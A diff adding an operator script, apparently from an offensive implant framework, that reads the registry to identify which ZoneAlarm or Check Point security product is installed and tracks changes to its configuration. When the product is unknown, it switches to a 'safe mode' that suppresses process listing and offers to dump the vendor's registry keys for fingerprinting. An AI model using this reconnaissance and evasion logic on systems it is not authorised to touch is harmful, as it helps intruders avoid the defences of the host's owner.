@@ -1,0 +1,125 @@
+@include "PSPHelpers.epm";
+@include "PerlFunctions.epm";
+
+string $version = "empty";
+string $value_data;
+string $subkey;
+string $versionNumber;
+
+echo "Starting Zone Alarm configuration change check";
+@echo off;
+@record on;
+# Check Zone Alarm versions
+
+
+if(`regquery -hive L -subkey "Software\\Zone Labs\\ZoneAlarm\\Registration"`) {
+	$subkey = GetCmdData("subkey");	
+	if(`regquery -hive L -subkey "Software\\Zone Labs\\ZoneAlarm\\Registration\\$subkey[0]" -value ProductName`) {
+		$value_data = GetCmdData("value_data");
+		if($value_data[0] == "ZoneAlarm Security Suite") {
+			if(`regquery -hive L -subkey "Software\\Zone Labs\\ZoneAlarm" -value CurrentVersion`) {
+				$value_data = GetCmdData("value_data");
+				$version = "Internet Security Suite V.$value_data[0]";
+			}else{
+				$version = "Internet Security Suite V.UNK";
+			}
+			za($version);
+		}else if($value_data[0] == "ZoneAlarm Anti-virus") {
+			if(`regquery -hive L -subkey "Software\\Zone Labs\\ZoneAlarm" -value CurrentVersion`) {
+				$value_data = GetCmdData("value_data");
+				$version = "Anti-Virus V.$value_data[0]";
+			}else{
+				$version = "Anti-Virus V.UNK";
+			}
+			za($version);
+		}else if($value_data[0] == "ZoneAlarm") {
+			if(`regquery -hive L -subkey "Software\\Zone Labs\\ZoneAlarm" -value CurrentVersion`) {
+				$value_data = GetCmdData("value_data");
+				$version = "Firewall V.$value_data[0]";
+			}else{
+				$version = "Firewall V.UNK";
+			}
+			za($version);
+		}else if($value_data[0] == "ZoneAlarm Pro") {
+			if(`regquery -hive L -subkey "Software\\Zone Labs\\ZoneAlarm" -value CurrentVersion`) {
+				$value_data = GetCmdData("value_data");
+				$version = "Pro V.$value_data[0]";
+			}else{
+				$version = "Pro V.UNK";
+			}
+			za($version);
+		}							
+		
+	}
+	
+}
+
+if(`regquery -hive L -subkey "Software\\Checkpoint\\ISW" -value InstallPath`) {
+	$value_data = GetCmdData("value_data");
+	string $value = "$value_data[0]";
+	string $dirs = split("\\", $value);
+	string $dir;
+	
+	foreach $dir ($dirs) {
+		$value = $dir;
+	}
+
+	if($value == "ZAForceField") {
+		$version = "ForceField";
+		za($version);
+	}
+}
+
+if(`regquery -hive L -subkey "Software\\ZoneAlarmSB"`) {
+	$version = "Spy Blocker";
+	za($version);
+}
+
+
+
+if($version == "empty") {
+	echo "Current Version: Unknown!";
+	# We don't know what it is lets default to safe mode
+	safety();
+	if (prompt "Pull Zone Alarm registry information?") {
+		`background regquery -hive L -subkey "software\\Zone Labs" -recursive`;
+	} else {
+		echo "Please reconsider so we can fingerprint this...";
+	}
+}
+
+sub safety() {
+	SetEnv("NOPROCINFO", "TRUE");
+}
+
+sub za(IN string $version) {
+	@record on;
+	#The struct is defined in PSPHelpers.epm
+	metaData @metaData;
+	#initialize the struct
+	init(@metaData);
+
+	if(@metaData.$history){
+		if(checkConfig("zonealarm:$version",@metaData)){
+			echo "\r\rNo change in PSP configs.\r\r";
+		}else{
+			echo "\r\r!!!Changed PSP configs since last time!!!\r\r";
+		}
+	}
+	
+	echo "Writing PSP Metadata information to pspInformation.txt";
+
+	# Don't have much to put here at the moment...	
+	@metaData.$vendor = "CheckPoint";
+	@metaData.$product = "Zone Alarm";
+	@metaData.$version = $version;
+
+	@record off;
+	if(writeMetaData(@metaData)) {
+		echo "Wrote meta data to disk";
+	} else {
+		echo "ERROR: Could not write meta data to disk.";
+	}
+	echo "Current Version: @metaData.$product (@metaData.$version)";
+}
+
